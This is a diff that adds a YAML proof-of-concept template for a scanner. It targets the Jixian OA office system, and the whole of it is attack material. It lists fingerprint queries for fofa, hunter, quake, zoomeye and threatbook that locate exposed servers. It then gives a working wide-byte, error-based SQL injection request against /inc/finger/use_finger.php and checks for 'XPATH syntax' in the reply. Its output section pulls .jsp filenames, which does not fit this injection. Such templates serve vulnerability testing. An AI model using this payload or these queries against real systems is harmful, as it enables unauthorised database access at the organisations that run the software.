@@ -1,0 +1,45 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: icon_hash="1967132225" || body="/images/sohuu.ico"
+    hunter-query: web.icon=="d8028456021988373d7eca8b7ec28f09"
+    quake-query: app:"极限OA办公系统"
+    zoomeye-query: title:"GSD 网络智能办公系统"
+    threatbook-query: body="/images/sohuu.ico"
+    cve: 
+    cnvd:
+    tips:  mysql | 报错注入 (宽字节注入)
+    
+name: poc-yaml-jixian-OA-use_finger.php-sqli
+manual: true
+transport: http
+set:
+    s1: randomInt(1000000000, 9000000000)
+    s2: randomLowercase(8)
+    reverse: newReverse()
+    reverseURL: reverse.url
+    t1: timeConvert(now(), '2006-01-02')
+rules:
+  r0:
+    request:
+      method: GET
+      cache: true
+      path: /inc/finger/use_finger.php?USER_ID=-1%df%27and%20extractvalue(1,%20concat(0x5c,(select%20MD5(520))))%23
+      follow_redirects: false      
+      headers:
+      body:
+    expression: >-
+      response.status == 200 && response.body_string.contains("XPATH syntax")
+
+    output:
+      search: |-
+        "(?P<filename>\\w+.jsp)".bsubmatch(response.body)
+      filename: search["filename"]
+      search1: |-
+        "(?P<newpath>ico.*jsp)".bsubmatch(response.body)
+      newpath: search["newpath"]
+
+expression: r0() 
